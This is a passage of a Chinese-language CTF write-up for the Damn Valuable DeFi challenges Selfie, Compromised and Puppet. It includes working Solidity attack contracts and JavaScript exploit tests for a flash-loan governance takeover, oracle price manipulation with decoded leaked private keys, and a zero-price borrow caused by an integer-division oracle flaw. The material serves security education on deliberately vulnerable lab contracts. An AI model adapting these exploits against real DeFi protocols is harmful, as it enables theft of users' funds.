        require(receiver != address(this), "Cannot queue actions that affect Governance");
        uint256 actionId = actionCounter;
        GovernanceAction storage actionToQueue = actions[actionId];
        actionToQueue.receiver = receiver;
        actionToQueue.weiAmount = weiAmount;
        actionToQueue.data = data;
        actionToQueue.proposedAt = block.timestamp;
        actionCounter++;
        emit ActionQueued(actionId, msg.sender);
        return actionId;
    }
    function _hasEnoughVotes(address account) private view returns (bool) {
        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
很明显我们可以通过贷款池的贷款操作，满足 `_hasEnoughVotes()` 的条件，然后构造好特定 data 后传入 `queueAction()`
函数，然后归还贷款，最后执行 `executeAction()` 函数，触发我们的 payload，成功清空贷款池。根据思路编写并部署攻击合约，成功利用：
    pragma solidity ^0.6.0;
    import "../DamnValuableTokenSnapshot.sol";
    interface ISelfiePool {
        function flashLoan(uint256 borrowAmount) external;
        function drainAllFunds(address receiver) external;
    }
    interface ISimpleGovernance {
        function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
        function executeAction(uint256 actionId) external payable;
    }
    contract AttackSelfie {
        address public owner;
        ISelfiePool public pool;
        ISimpleGovernance public governance;
        uint256 public actionId;
        constructor(ISelfiePool _pool, ISimpleGovernance _governance) public {
            owner = msg.sender;
            pool = _pool;
            governance = _governance;
        }
        function attack0(uint256 amount) public {
            pool.flashLoan(amount);
        }
        function receiveTokens(address _token, uint256 _amount) public {
            DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
            token.snapshot();
            bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            );
            actionId = governance.queueAction(address(pool), data, 0);
            token.transfer(address(pool), _amount);
        }
        function attack1() public {
            governance.executeAction(actionId);
        }
    }
    const AttackReward = contract.fromArtifact('AttackReward');
    it('Exploit', async function () {
        await time.increase(time.duration.days(5));
        const attack = await AttackReward.new(this.liquidityToken.address, this.rewardToken.address, this.flashLoanPool.address, this.rewarderPool.address, { from: attacker});
        await attack.attack(TOKENS_IN_LENDER_POOL, { from: attacker });
    });
## Compromised
> While poking around a web service of one of the most popular DeFi projects
> in the space, you get a somewhat strange response from their server. This is
> a snippet:
>  
>  
>               HTTP/2 200 OK
>               content-type: text/html
>               content-language: en
>               vary: Accept-Encoding
>               server: cloudflare
>
>               4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59
> 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47
> 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a
> 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
>
>               4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59
> 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32
> 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a
> 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
>  
>
> A related on-chain exchange is selling (absurdly overpriced) collectibles
> called “DVNFT”, now at 999 ETH each
>
> This price is fetched from an on-chain oracle, and is based on three trusted
> reporters:
> `0xA73209FB1a42495120166736362A1DfA9F95A105`,`0xe92401A4d3af5E446d93D11EEc806b1462b39D15`
> and `0x81A5D6E50C214044bE44cA0CB057fe119097850c`.
>
> You must steal all ETH available in the exchange.
本题要求我们从交换所中提走全部的 ETH，阅读交换所的合约代码：
    contract Exchange is ReentrancyGuard {
        using SafeMath for uint256;
        using Address for address payable;
        DamnValuableNFT public token;
        TrustfulOracle public oracle;
        event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
        event TokenSold(address indexed seller, uint256 tokenId, uint256 price);
        constructor(address oracleAddress) public payable {
            token = new DamnValuableNFT();
            oracle = TrustfulOracle(oracleAddress);
        }
        function buyOne() external payable nonReentrant returns (uint256) {
            uint256 amountPaidInWei = msg.value;
            require(amountPaidInWei > 0, "Amount paid must be greater than zero");
            // Price should be in [wei / NFT]
            uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
            require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");
            uint256 tokenId = token.mint(msg.sender);
            msg.sender.sendValue(amountPaidInWei - currentPriceInWei);
            emit TokenBought(msg.sender, tokenId, currentPriceInWei);
        }
        function sellOne(uint256 tokenId) external nonReentrant {
            require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
            require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");
            // Price should be in [wei / NFT]
            uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
            require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");
            token.transferFrom(msg.sender, address(this), tokenId);
            token.burn(tokenId);
            msg.sender.sendValue(currentPriceInWei);
            emit TokenSold(msg.sender, tokenId, currentPriceInWei);
        }
        receive() external payable {}
    }
可以发现无论是卖出还是买入，其价格均由 `oracle.getMedianPrice(token.symbol());`
决定，而定位相应的源码，可以发现真正的计算公式如下：
    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));
        // calculate median price
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }
而唯一修改价格的方式如下：
    modifier onlyTrustedSource() {
        require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));
        _;
    }
    function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
        _setPrice(msg.sender, symbol, newPrice);
    }
    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
        uint256 oldPrice = pricesBySource[source][symbol];
        pricesBySource[source][symbol] = newPrice;
        emit UpdatedPrice(source, symbol, oldPrice, newPrice);
    }
这意味着，当且仅当我们控制了 TrustedSource，我们就能控制购买的价格。此时恰好发现，题目提供的信息其实是其中两个 TrustedSource
的私钥：
    #!/usr/bin/env python2
    def get_private_key(bytes):
        return ''.join(bytes.split(' ')).decode('hex').decode('base64')
    get_private_key('4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35')
    # 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 => 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
    get_private_key('4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34')
    # 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 => 0x81A5D6E50C214044bE44cA0CB057fe119097850c
通过我们控制的 TrustedSource，我们能任意修改买入卖出的价格，最后编写利用的代码如下：
    it('Exploit', async function () {
        const leakedAccounts = ['0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'].map(pk=>web3.eth.accounts.privateKeyToAccount(pk));
        for (let account of leakedAccounts) {
            await web3.eth.personal.importRawKey(account.privateKey, '');
            web3.eth.personal.unlockAccount(account.address, '', 999999);
            // 修改最低价
            await this.oracle.postPrice('DVNFT', 0, { from: account.address });
        }
        // 买入
        await this.exchange.buyOne({ from: attacker, value: 1 });
        // 修改为最高价格
        const exchangeBalance = await balance.current(this.exchange.address);
        await this.oracle.postPrice("DVNFT", exchangeBalance, { from: leakedAccounts[0].address});
        await this.oracle.postPrice("DVNFT", exchangeBalance, { from: leakedAccounts[1].address});
        await this.token.approve(this.exchange.address, 1, { from: attacker });
        // 卖出
        await this.exchange.sellOne(1, { from: attacker })
    });
## Puppet
> There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you
> first need to deposit twice the borrow amount in ETH as collateral. The pool
> currently has 10000 DVTs in liquidity.
>
> There’s a DVT market opened in an [Uniswap v1
> exchange](https://uniswap.org/docs/v1/), currently with 10 ETH and 10 DVT in
> liquidity.
>
> Starting with 100 ETH and 100 DVTs in balance, you must steal as many tokens
> as possible from the lending pool. And at the end of the attack, your ETH
> balance shouldn’t have decreased.
题目最核心的代码 `borrow()` 函数会根据传入的 ETH 数目，借出对应数目的 token，其中数目计算的关键在于
`computeOraclePrice()` 函数:
    function borrow(uint256 borrowAmount) public payable nonReentrant {
        uint256 amountToDeposit = msg.value;
        uint256 tokenPriceInWei = computeOraclePrice();
        uint256 depositRequired = borrowAmount.mul(tokenPriceInWei) * 2;
        require(amountToDeposit >= depositRequired, "Not depositing enough collateral");
        if (amountToDeposit > depositRequired) {
            uint256 amountToReturn = amountToDeposit - depositRequired;
            amountToDeposit -= amountToReturn;
            msg.sender.sendValue(amountToReturn);
        }        
        deposits[msg.sender] += amountToDeposit;
        // Fails if the pool doesn't have enough tokens in liquidity
        require(token.transfer(msg.sender, borrowAmount), "Transfer failed");
    }
继续阅读合约的源代码，可以发现 `computeOraclePrice()` 计算过程存在着一定问题，如果 `uniswapOracle.balance <
token.balanceOf(uniswapOracle)`，那么得到的结果其实是 0：
    function computeOraclePrice() public view returns (uint256) {
        return uniswapOracle.balance.div(token.balanceOf(uniswapOracle));
    }
那么解题的思路非常明确，先通过调用 Uniswap v1 提供的 `tokenToEthSwapInput()` 函数，将我们拥有的部分 token 转换成
ETH，满足 `uniswapOracle.balance < token.balanceOf(uniswapOracle)` 的要求，然后直接调用
`borrow()` 函数，用 0 的代价清空贷款池。编写利用的代码：
    it('Exploit', async function () {
        const deadline = (await web3.eth.getBlock('latest')).timestamp + 300;
        await this.token.approve(this.uniswapExchange.address, ether('0.01'), { from: attacker });
        await this.uniswapExchange.tokenToEthSwapInput(ether('0.01'), 1, deadline, { from: attacker });
        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { from: attacker });
    });
本题的考点非常经典，如果有阅读过现成源代码经历的同学就会意识到，真正正确的做法是将需要转换的币种，先做乘法运算，得到一个较大的数字之后再去做除法运算，这样才能得到一个正确的数字，否则在不存在小数的情况下，很容易得到一个过小的数字（甚至是
0）。
## 总结
这 8 道题目的非常有意思地总结了现有 DeFi
项目在开发过程中可能或已经遇到的问题，以及生态中的一些薄弱点，并将这些知识通过题目的方式展现给了大家。在做完这些题目后，对智能合约的安全，特别是整个
DeFi 生态安全有了更清醒的认识。